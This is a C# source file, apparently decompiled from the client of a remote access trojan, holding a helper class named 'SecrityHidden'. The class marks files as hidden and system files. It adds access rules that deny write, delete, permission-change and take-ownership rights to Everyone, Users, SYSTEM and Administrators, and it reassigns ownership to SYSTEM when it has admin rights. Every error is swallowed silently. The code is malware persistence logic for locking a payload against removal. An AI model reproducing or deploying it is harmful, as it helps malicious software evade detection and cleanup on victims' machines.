using System.IO;
using System.Security.AccessControl;
using System.Security.Principal;

namespace Client.Helper;

internal class SecrityHidden
{
	public static string[] NamingAdm = new string[2] { "S-1-5-18", "S-1-5-32-544" };

	public static string[] Naming = new string[2] { "S-1-1-0", "S-1-5-32-545" };

	public static void Unlock(string path)
	{
		try
		{
			bool flag = Directory.Exists(path);
			if (!flag && !File.Exists(path))
			{
				return;
			}
			try
			{
				string[] naming = Naming;
				foreach (string account in naming)
				{
					RemoveFileSystemSecurity(path, account, FileSystemRights.Write | FileSystemRights.Delete | FileSystemRights.ChangePermissions | FileSystemRights.TakeOwnership, AccessControlType.Deny, flag);
				}
				if (Config.Privilege == EncryptString.Decode("Admin"))
				{
					naming = NamingAdm;
					foreach (string account2 in naming)
					{
						RemoveFileSystemSecurity(path, account2, FileSystemRights.Write | FileSystemRights.Delete | FileSystemRights.ChangePermissions | FileSystemRights.TakeOwnership, AccessControlType.Deny, flag);
					}
				}
			}
			catch
			{
			}
			if (!flag)
			{
				FileInfo fileInfo = new FileInfo(path);
				fileInfo.Directory.Attributes = FileAttributes.Normal;
				fileInfo.Attributes = FileAttributes.Normal;
			}
		}
		catch
		{
		}
	}

	public static void HiddenFile(string path)
	{
		try
		{
			bool flag = Directory.Exists(path);
			if (!flag && !File.Exists(path))
			{
				return;
			}
			if (!flag)
			{
				FileInfo fileInfo = new FileInfo(path);
				if (Config.Privilege == EncryptString.Decode("Admin"))
				{
					fileInfo.Attributes = FileAttributes.Hidden | FileAttributes.System;
				}
				else
				{
					fileInfo.Attributes = FileAttributes.Hidden;
				}
			}
			string[] naming = Naming;
			foreach (string account in naming)
			{
				AddFileSystemSecurity(path, account, FileSystemRights.Write | FileSystemRights.Delete | FileSystemRights.ChangePermissions | FileSystemRights.TakeOwnership, AccessControlType.Deny, flag);
				AddFileSystemSecurity(path, account, FileSystemRights.ReadAndExecute, AccessControlType.Allow, flag);
			}
			if (Config.Privilege == EncryptString.Decode("Admin"))
			{
				SetOwnerToSystem(path, flag);
				naming = NamingAdm;
				foreach (string account2 in naming)
				{
					AddFileSystemSecurity(path, account2, FileSystemRights.Write | FileSystemRights.Delete | FileSystemRights.ChangePermissions | FileSystemRights.TakeOwnership, AccessControlType.Deny, flag);
					AddFileSystemSecurity(path, account2, FileSystemRights.ReadAndExecute, AccessControlType.Allow, flag);
				}
			}
		}
		catch
		{
		}
	}

	public static void ProtectFile(string path)
	{
		try
		{
			bool flag = Directory.Exists(path);
			if (!flag && !File.Exists(path))
			{
				return;
			}
			string[] naming = Naming;
			foreach (string account in naming)
			{
				AddFileSystemSecurity(path, account, FileSystemRights.Write | FileSystemRights.Delete | FileSystemRights.ChangePermissions | FileSystemRights.TakeOwnership, AccessControlType.Deny, flag);
				AddFileSystemSecurity(path, account, FileSystemRights.ReadAndExecute, AccessControlType.Allow, flag);
			}
			if (Config.Privilege == EncryptString.Decode("Admin"))
			{
				SetOwnerToSystem(path, flag);
				naming = NamingAdm;
				foreach (string account2 in naming)
				{
					AddFileSystemSecurity(path, account2, FileSystemRights.Write | FileSystemRights.Delete | FileSystemRights.ChangePermissions | FileSystemRights.TakeOwnership, AccessControlType.Deny, flag);
					AddFileSystemSecurity(path, account2, FileSystemRights.ReadAndExecute, AccessControlType.Allow, flag);
				}
			}
		}
		catch
		{
		}
	}

	public static void SetOwnerToSystem(string path, bool isDir)
	{
		try
		{
			FileSystemSecurity fileSystemSecurity = (isDir ? ((FileSystemSecurity)Directory.GetAccessControl(path)) : ((FileSystemSecurity)File.GetAccessControl(path)));
			fileSystemSecurity.SetOwner(new SecurityIdentifier("S-1-5-18"));
			if (isDir)
			{
				Directory.SetAccessControl(path, (DirectorySecurity)fileSystemSecurity);
			}
			else
			{
				File.SetAccessControl(path, (FileSecurity)fileSystemSecurity);
			}
		}
		catch
		{
		}
	}

	public static void AddFileSystemSecurity(string fileName, string account, FileSystemRights rights, AccessControlType controlType, bool isDir)
	{
		try
		{
			FileSystemSecurity fileSystemSecurity = (isDir ? ((FileSystemSecurity)Directory.GetAccessControl(fileName)) : ((FileSystemSecurity)File.GetAccessControl(fileName)));
			if (isDir)
			{
				fileSystemSecurity.AddAccessRule(new FileSystemAccessRule(account, rights, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, controlType));
			}
			else
			{
				fileSystemSecurity.AddAccessRule(new FileSystemAccessRule(account, rights, controlType));
			}
			if (isDir)
			{
				Directory.SetAccessControl(fileName, (DirectorySecurity)fileSystemSecurity);
			}
			else
			{
				File.SetAccessControl(fileName, (FileSecurity)fileSystemSecurity);
			}
		}
		catch
		{
		}
	}

	public static void RemoveFileSystemSecurity(string fileName, string account, FileSystemRights rights, AccessControlType controlType, bool isDir)
	{
		try
		{
			FileSystemSecurity fileSystemSecurity = (isDir ? ((FileSystemSecurity)Directory.GetAccessControl(fileName)) : ((FileSystemSecurity)File.GetAccessControl(fileName)));
			if (isDir)
			{
				fileSystemSecurity.RemoveAccessRule(new FileSystemAccessRule(account, rights, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, controlType));
			}
			else
			{
				fileSystemSecurity.RemoveAccessRule(new FileSystemAccessRule(account, rights, controlType));
			}
			if (isDir)
			{
				Directory.SetAccessControl(fileName, (DirectorySecurity)fileSystemSecurity);
			}
			else
			{
				File.SetAccessControl(fileName, (FileSecurity)fileSystemSecurity);
			}
		}
		catch
		{
		}
	}
}
